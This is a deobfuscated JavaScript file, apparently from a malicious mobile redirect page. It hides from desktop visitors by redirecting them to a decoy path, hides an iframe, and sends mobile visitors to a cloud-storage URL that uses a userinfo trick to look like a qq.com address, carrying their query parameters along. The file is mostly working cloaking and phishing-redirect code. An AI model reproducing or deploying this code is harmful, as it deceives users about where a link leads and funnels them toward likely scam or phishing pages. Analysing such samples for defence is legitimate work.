//Mon Mar 31 2025 15:27:05 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && /^(Win|Mac)/i.test(navigator.platform)) {
  location.href = "HamooBCkUB/" + new Date().getTime();
  throw SyntaxError();
}
var turl = ["https://{nnnnnnnn}.qq.com@cos.ap-chengdu.myqcloud.com/pet-1254154566/material-app/c0ccec0f-cdb9-4af0-a9d2-4b3f5027c76f.html?{wwnmmnn}"];
if (getVideoid("t") !== false) var urls = turl;else var urls = turl;
document.addEventListener("DOMContentLoaded", function () {
  const _0x36e05d = document.getElementsByTagName("iframe")[0];
  setTimeout(function () {
    _0x36e05d && (_0x36e05d.style.display = "none");
  }, 1200);
});
function callQQback() {
  var _0x132ee0 = myChat(urls);
  _0x132ee0 = syncUrlParams(window.location.href, _0x132ee0);
  window.location.href = _0x132ee0;
}
function myChat(_0x5e1dd0) {
  return _0x5e1dd0 = typeof _0x5e1dd0 == "object" ? _0x5e1dd0[Math.floor(Math.random() * _0x5e1dd0.length)] : _0x5e1dd0, _0x5e1dd0.replace(/\{(\w+?)\}/g, function (_0x487fc5, _0x10eb22) {
    var _0x1b917f = "";
    _0x10eb22 = _0x10eb22.toUpperCase();
    for (var _0xf09b6e = 0; _0xf09b6e < _0x10eb22.length; _0xf09b6e++) {
      if ("N" == _0x10eb22[_0xf09b6e]) _0x1b917f += Math.floor(Math.random() * 10);else "D" == _0x10eb22[_0xf09b6e] ? _0x1b917f += String.fromCharCode(65 + Math.floor(Math.random() * 26)) : _0x1b917f += String.fromCharCode(97 + Math.floor(Math.random() * 26));
    }
    return _0x1b917f;
  });
}
function syncUrlParams(_0x5e6a65, _0x36cacc) {
  const _0x430397 = new URL(_0x5e6a65),
    _0x19801f = new URL(_0x36cacc);
  for (const [_0x3b672a, _0x1a76b0] of _0x430397.searchParams.entries()) {
    !_0x19801f.searchParams.has(_0x3b672a) && _0x19801f.searchParams.append(_0x3b672a, _0x1a76b0);
  }
  return _0x19801f.toString();
}
function getVideoid(_0x259d3b) {
  (function () {})();
  var _0xbba900 = window.location.search.substring(1),
    _0x5f4e68 = _0xbba900.split("&");
  for (var _0x3bf9ca = 0; _0x3bf9ca < _0x5f4e68.length; _0x3bf9ca++) {
    var _0x44c581 = _0x5f4e68[_0x3bf9ca].split("=");
    if (_0x44c581[0] == _0x259d3b) {
      return _0x44c581[1];
    }
  }
  return false;
}